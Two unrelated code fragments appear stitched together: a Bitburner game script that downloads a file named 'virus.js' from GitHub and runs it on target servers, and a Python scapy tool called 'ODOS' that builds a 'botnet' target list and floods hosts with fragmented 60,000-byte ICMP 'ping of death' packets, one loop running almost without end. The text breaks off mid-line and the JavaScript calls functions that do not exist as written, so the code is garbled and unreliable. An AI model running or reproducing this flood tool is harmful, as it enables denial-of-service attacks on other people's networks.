/** @param {NS} ns */
export async function main(ns) {
	// 32G RAM required
	
	// Take in hackable servers
	var targets = [ns.args[0], ns.args[1], ns.args[2], ns.args[3]]; // Min: 4 add more if u want.

	// Iterate through each
	for (let target in targets) {
		if (connect(target) == true) { // if you can connect
			// connect, download code, run the code.
			await connect(target); 
			await wget('https://github.com/LOLROW/Bitburner-Scripts/blob/main/test.js', 'virus.js');
			await run('virus.js', target);
		}
	}
}


from scapy.all import *
from typing import List
import os

os.system("cls")

finalizedList = []

def createTargetlist(size: int, targetList: List) -> List[str]:
	print(f"\nCreating target list with size: {size}")
	print(f"Finalized target list: {targetList}\n")

	return targetList

if __name__ == "__main__":
	exit_ = False

	print ("""
      :::::::: :::::::::    ::::::::   :::::::: 
    :+:    :+: :+:    :+: :+:    :+: :+:    :+: 
   +:+    +:+ +:+    +:+ +:+    +:+ +:+         
  +#+    +:+ +#+    +:+ +#+    +:+ +#++:++#++   
 +#+    +#+ +#+    +#+ +#+    +#+        +#+    
#+#    #+# #+#    #+# #+#    #+# #+#    #+#     
########  #########   ########   ########       

Welcome to ODOS! The really bad dos tool.

To get started, type "help" for help.

------------------------------------------------
    """)
	while (exit_ == False): # until the program is closed, continue taking responses from user (this is pretty much the commandline)
		getUserResponse = input("odos > "); getUserResponse = getUserResponse.split() # this is too
		responseLength = len(getUserResponse)
		match getUserResponse[0]:
			case "exit": os.system("cls"); exit_ = True
			case "botnet":
				targets = []
				for i in range(len(getUserResponse) - 2):
					i = i + 1
					targets.append(getUserResponse[i + 1])
				finalizedList = createTargetlist(getUserResponse[1], targets)
			case "send":
				if (getUserResponse[1] == "pod"): # pod = ping of death
					if (getUserResponse[2] != "*"):
						for i in range(int(getUserResponse[1])):
							for j in range(len(finalizedList)):
								send(fragment(IP(dst = finalizedList[j])/ICMP()/("X" * 60000))) # Taken from the scapy official documentation
					else:
						for i in range(10000000000):
							for j in range(len(finalizedList)):
								send(fragment(IP(dst = finalizedList[j])/ICMP()/("X" * 60000))) # Taken from the scapy official documentation
				elif (getUserResponse[1] == "arp")
